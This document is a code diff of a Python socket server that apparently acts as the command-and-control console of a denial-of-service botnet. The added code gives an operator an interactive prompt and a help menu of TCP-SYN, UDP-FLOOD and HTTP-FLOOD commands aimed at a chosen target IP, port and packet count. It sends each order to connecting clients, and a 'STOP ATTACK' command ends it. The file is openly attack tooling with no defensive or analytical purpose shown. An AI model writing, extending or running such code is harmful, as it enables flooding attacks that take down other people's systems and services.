@@ -6,24 +6,26 @@ def send_response(message, client):
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-server.bind(("localhost", 7323))
+server.bind(("localhost", 9001))
 
-server.listen(10)
-
+server.listen(1000)
+print("Enter the commands here, type h to see view the commands:")
 while True:
-    (client, address) = server.accept()
+    message = input(">>> ")
+    if(message == "h" or message == "help"):
+        print("""These are the commands that can be used: 
+        SEND TCP-SYN <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
+        SEND UDP-FLOOD <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
+        SEND HTTP-FLOOD <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
+        STOP ATTACK - TO STOP ATTACK
+        """)
+        continue
+    elif(message == "STOP ATTACK" or message == "STOP attack"):
+        print("You have ended the attack!")
+        break    
+    else:
+        (client, address) = server.accept()
+        send_response(message, client)
+        client.close()
 
-    try:
-        target_file = open("target.txt", "r")
-        target_data = target_file.read().split(" ")
-        target_file.close()
-        if len(target_data) == 3:
-            send_response(f'SEND TCP-SYN {target_data[0]} {target_data[1]} {target_data[2]}', client)
-        else:
-            send_response("NONE", client)
-    except Exception as e:
-        send_response("NONE", client)
-        print(e)
-
-    client.close()
-
+    
